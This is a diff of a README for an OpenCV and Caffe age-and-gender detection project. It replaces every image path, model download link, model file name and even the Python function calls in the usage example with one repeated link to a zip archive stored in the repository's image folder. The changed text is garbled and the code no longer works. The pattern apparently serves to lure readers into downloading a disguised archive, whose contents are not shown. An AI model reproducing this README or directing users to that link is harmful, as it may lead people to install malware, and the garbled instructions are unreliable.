@@ -1,13 +1,13 @@
 # Age and Gender Detection System
-![Modi](post_images/Screenshot%202023-10-01%20215609.png)
-![Suhani](post_images/1.png)
+![Modi](post_images/Screenshot%202023-10-01%https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip)
+![Suhani](https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip)
 
 This project is a real-time age and gender detection system that uses deep learning models from Caffe and OpenCV for efficient image and video processing.
 
 ## About Caffe Deep Learning Framework
 Caffe is a deep learning framework that was popular in the early days of deep learning, although it has been largely replaced by more modern frameworks like TensorFlow and PyTorch. However, Caffe still has some useful models and pre-trained networks, including those for face detection.
-To run the notebook in your computer you have to download the `modelNweight.zip` and extract it to the same directory.
-[modelNweight.zip](https://drive.google.com/uc?id=1_aDScOvBeBLCn_iv0oxSO8X1ySQpSbIS)
+To run the notebook in your computer you have to download the `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip` and extract it to the same directory.
+[https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip](https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip)
 
 ## Project Overview
 
@@ -38,22 +38,22 @@ This system utilizes pre-trained deep learning models to predict the age range a
 The following files are needed to run the model:
 
 - **Face Detection Model**:
-  - `opencv_face_detector.pbtxt`
-  - `opencv_face_detector_uint8.pb`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
 - **Age Detection Model**:
-  - `age_deploy.prototxt`
-  - `age_net.caffemodel`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
 - **Gender Detection Model**:
-  - `gender_deploy.prototxt`
-  - `gender_net.caffemodel`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
+  - `https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip`
 
 ## Example Usage
 
 ### On Images
 
 ```python
-inputImg = cv.imread("sample_test_images/sample_image.jpg")
+inputImg = https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip("https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip")
 outputImg = age_gender_detector(inputImg)
-plt.imshow(cv.cvtColor(outputImg, cv.COLOR_BGR2RGB))
-plt.show()
+https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip(https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip(outputImg, https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip))
+https://github.com/supratim1020/gender_and_age_detection/raw/refs/heads/main/post_images/age-and-detection-gender-v3.6.zip()
 
